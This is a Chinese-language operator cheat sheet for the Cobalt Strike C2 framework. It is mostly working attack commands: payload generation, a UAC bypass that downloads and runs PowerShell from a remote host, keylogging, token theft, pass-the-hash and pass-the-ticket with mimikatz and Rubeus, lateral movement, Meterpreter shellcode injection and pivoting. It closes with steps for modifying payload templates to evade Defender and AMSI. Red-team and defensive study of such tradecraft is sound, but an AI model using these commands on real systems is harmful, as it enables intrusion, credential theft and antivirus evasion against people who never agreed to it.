# Cobalt Strike

### Listeners

### C2 Listeners

`Cobalt Strike -> Listeners -> Add/Edit` 然后您可以选择监听的位置、使用的信标类型（http、dns、smb...）等。

### Peer2Peer Listeners

这些监听器的信标不需要直接与C2通信，它们可以通过其他信标与其通信。

`Cobalt Strike -> Listeners -> Add/Edit` 然后您需要选择TCP或SMB信标

* **TCP信标将在所选端口设置监听器**。要连接到TCP信标，请使用命令 `connect <ip> <port>` 从另一个信标
* **smb信标将在选定名称的管道中监听**。要连接到SMB信标，您需要使用命令 `link [target] [pipe]`。

### Generate & Host payloads

#### Generate payloads in files

`Attacks -> Packages ->`

* **`HTMLApplication`** 用于HTA文件
* **`MS Office Macro`** 用于带有宏的办公文档
* **`Windows Executable`** 用于.exe、.dll或服务.exe
* **`Windows Executable (S)`** 用于**无阶段**的.exe、.dll或服务.exe（无阶段比有阶段更好，IoCs更少）

#### Generate & Host payloads

`Attacks -> Web Drive-by -> Scripted Web Delivery (S)` 这将生成一个脚本/可执行文件，以从cobalt strike下载信标，格式包括：bitsadmin、exe、powershell和python

#### Host Payloads

如果您已经有要在Web服务器上托管的文件，只需转到 `Attacks -> Web Drive-by -> Host File` 并选择要托管的文件和Web服务器配置。

### Beacon Options

<pre class="language-bash"><code class="lang-bash"># 执行本地 .NET 二进制文件
execute-assembly </path/to/executable.exe>

# 截图
printscreen    # 通过 PrintScr 方法拍摄单个截图
screenshot     # 拍摄单个截图
screenwatch    # 定期拍摄桌面截图
## 转到 View -> Screenshots 查看它们

# 键盘记录器
keylogger [pid] [x86|x64]
## View > Keystrokes 查看按下的键

# 端口扫描
portscan [pid] [arch] [targets] [ports] [arp|icmp|none] [max connections] # 在另一个进程中注入端口扫描操作
portscan [targets] [ports] [arp|icmp|none] [max connections]

# Powershell
# 导入 Powershell 模块
powershell-import C:\path\to\PowerView.ps1
powershell <just write powershell cmd here>

# 用户冒充
## 使用凭据生成令牌
make_token [DOMAIN\user] [password] # 创建令牌以在网络中冒充用户
ls \\computer_name\c$ # 尝试使用生成的令牌访问计算机上的C$
rev2self # 停止使用make_token生成的令牌
## 使用make_token会生成事件4624：账户成功登录。此事件在Windows域中非常常见，但可以通过过滤登录类型来缩小范围。如上所述，它使用LOGON32_LOGON_NEW_CREDENTIALS，类型为9。

# UAC 绕过
elevate svc-exe <listener>
elevate uac-token-duplication <listener>
runasadmin uac-cmstplua powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://10.10.5.120:80/b'))"

## 从pid窃取令牌
## 类似于make_token，但从进程中窃取令牌
steal_token [pid] # 此外，这对于网络操作有用，而不是本地操作
## 从API文档中我们知道，这种登录类型“允许调用者克隆其当前令牌”。这就是为什么信标输出显示冒充<current_username> - 它正在冒充我们自己的克隆令牌。
ls \\computer_name\c$ # 尝试使用生成的令牌访问计算机上的C$
rev2self # 停止使用steal_token的令牌

## 使用新凭据启动进程
spawnas [domain\username] [password] [listener] # 从具有读取权限的目录执行，例如：cd C:\
## 类似于make_token，这将生成Windows事件4624：账户成功登录，但登录类型为2（LOGON32_LOGON_INTERACTIVE）。它将详细说明调用用户（TargetUserName）和冒充用户（TargetOutboundUserName）。

## 注入到进程中
inject [pid] [x64|x86] [listener]
## 从OpSec的角度来看：除非真的有必要，否则不要执行跨平台注入（例如x86 -> x64或x64 -> x86）。

## 传递哈希
## 此修改过程需要对LSASS内存进行修补，这是一个高风险操作，需要本地管理员权限，并且如果启用了受保护进程轻量级（PPL），则不太可行。
pth [pid] [arch] [DOMAIN\user] [NTLM hash]
pth [DOMAIN\user] [NTLM hash]

## 通过mimikatz传递哈希
mimikatz sekurlsa::pth /user:<username> /domain:<DOMAIN> /ntlm:<NTLM HASH> /run:"powershell -w hidden"
## 如果没有/run，mimikatz会生成cmd.exe，如果您以具有桌面的用户身份运行，他将看到shell（如果您以SYSTEM身份运行，则可以继续）
steal_token <pid> # 从mimikatz创建的进程中窃取令牌

## 传递票证
## 请求票证
execute-assembly C:\path\Rubeus.exe asktgt /user:<username> /domain:<domain> /aes256:<aes_keys> /nowrap /opsec
## 创建一个新的登录会话以使用新票证（以免覆盖被攻陷的票证）
make_token <domain>\<username> DummyPass
## 从powershell会话中将票证写入攻击者机器并加载
[System.IO.File]::WriteAllBytes("C:\Users\Administrator\Desktop\jkingTGT.kirbi", [System.Convert]::FromBase64String("[...ticket...]"))
kerberos_ticket_use C:\Users\Administrator\Desktop\jkingTGT.kirbi

## 从SYSTEM传递票证
## 使用票证生成新进程
execute-assembly C:\path\Rubeus.exe asktgt /user:<USERNAME> /domain:<DOMAIN> /aes256:<AES KEY> /nowrap /opsec /createnetonly:C:\Windows\System32\cmd.exe
## 从该进程中窃取令牌
steal_token <pid>

## 提取票证 + 传递票证
### 列出票证
execute-assembly C:\path\Rubeus.exe triage
### 通过luid转储有趣的票证
execute-assembly C:\path\Rubeus.exe dump /service:krbtgt /luid:<luid> /nowrap
### 创建新的登录会话，注意luid和processid
execute-assembly C:\path\Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe
### 在生成的登录会话中插入票证
execute-assembly C:\path\Rubeus.exe ptt /luid:0x92a8c /ticket:[...base64-ticket...]
### 最后，从新进程中窃取令牌
steal_token <pid>

# Lateral Movement
## 如果创建了令牌，将会使用它
jump [method] [target] [listener]
## 方法：
## psexec                    x86   使用服务运行服务EXE工件
## psexec64                  x64   使用服务运行服务EXE工件
## psexec_psh                x86   使用服务运行PowerShell一行代码
## winrm                     x86   通过WinRM运行PowerShell脚本
## winrm64                   x64   通过WinRM运行PowerShell脚本

remote-exec [method] [target] [command]
## 方法：
<strong>## psexec                          通过服务控制管理器远程执行
</strong>## winrm                           通过WinRM（PowerShell）远程执行
## wmi                             通过WMI远程执行

## 要使用wmi执行信标（它不在jump命令中），只需上传信标并执行
beacon> upload C:\Payloads\beacon-smb.exe
beacon> remote-exec wmi srv-1 C:\Windows\beacon-smb.exe


# Pass session to Metasploit - Through listener
## 在metaploit主机上
msf6 > use exploit/multi/handler
msf6 exploit(multi/handler) > set payload windows/meterpreter/reverse_http
msf6 exploit(multi/handler) > set LHOST eth0
msf6 exploit(multi/handler) > set LPORT 8080
msf6 exploit(multi/handler) > exploit -j

## 在cobalt上：Listeners > Add并将Payload设置为Foreign HTTP。将Host设置为10.10.5.120，将Port设置为8080，然后单击保存。
beacon> spawn metasploit
## 您只能使用外部监听器生成x86 Meterpreter会话。

# Pass session to Metasploit - Through shellcode injection
## 在metasploit主机上
msfvenom -p windows/x64/meterpreter_reverse_http LHOST=<IP> LPORT=<PORT> -f raw -o /tmp/msf.bin
## 运行msfvenom并准备multi/handler监听器

## 将bin文件复制到cobalt strike主机
ps
shinject <pid> x64 C:\Payloads\msf.bin # 在x64进程中注入metasploit shellcode

# Pass metasploit session to cobalt strike
## 生成无阶段的Beacon shellcode，转到Attacks > Packages > Windows Executable (S)，选择所需的监听器，选择Raw作为输出类型，并选择使用x64有效负载。
## 在metasploit中使用post/windows/manage/shellcode_inject注入生成的cobalt strike shellcode


# Pivoting
## 在teamserver中打开socks代理
beacon> socks 1080

# SSH connection
beacon> ssh 10.10.17.12:22 username password</code></pre>

## Avoiding AVs

### Artifact Kit

通常在`/opt/cobaltstrike/artifact-kit`中，您可以找到cobalt strike将用于生成二进制信标的代码和预编译模板（在`/src-common`中）。

使用[ThreatCheck](https://github.com/rasta-mouse/ThreatCheck)与生成的后门（或仅使用编译的模板），您可以找到触发防御者的原因。通常是一个字符串。因此，您可以修改生成后门的代码，以便该字符串不会出现在最终的二进制文件中。

修改代码后，只需从同一目录运行`./build.sh`，并将`dist-pipe/`文件夹复制到Windows客户端的`C:\Tools\cobaltstrike\ArtifactKit`中。
```
pscp -r root@kali:/opt/cobaltstrike/artifact-kit/dist-pipe .
```
不要忘记加载激进脚本 `dist-pipe\artifact.cna` 以指示 Cobalt Strike 使用我们想要的磁盘资源，而不是加载的资源。

### 资源包

ResourceKit 文件夹包含 Cobalt Strike 基于脚本的有效载荷模板，包括 PowerShell、VBA 和 HTA。

使用 [ThreatCheck](https://github.com/rasta-mouse/ThreatCheck) 和模板，您可以找到防御者（在这种情况下是 AMSI）不喜欢的内容并进行修改：
```
.\ThreatCheck.exe -e AMSI -f .\cobaltstrike\ResourceKit\template.x64.ps1
```
修改检测到的行可以生成一个不会被捕获的模板。

不要忘记加载激进脚本 `ResourceKit\resources.cna`，以指示 Cobalt Strike 使用我们想要的磁盘资源，而不是加载的资源。
```bash
cd C:\Tools\neo4j\bin
neo4j.bat console
http://localhost:7474/ --> Change password
execute-assembly C:\Tools\SharpHound3\SharpHound3\bin\Debug\SharpHound.exe -c All -d DOMAIN.LOCAL



# Change powershell
C:\Tools\cobaltstrike\ResourceKit
template.x64.ps1
# Change $var_code -> $polop
# $x --> $ar
cobalt strike --> script manager --> Load --> Cargar C:\Tools\cobaltstrike\ResourceKit\resources.cna

#artifact kit
cd  C:\Tools\cobaltstrike\ArtifactKit
pscp -r root@kali:/opt/cobaltstrike/artifact-kit/dist-pipe .


```

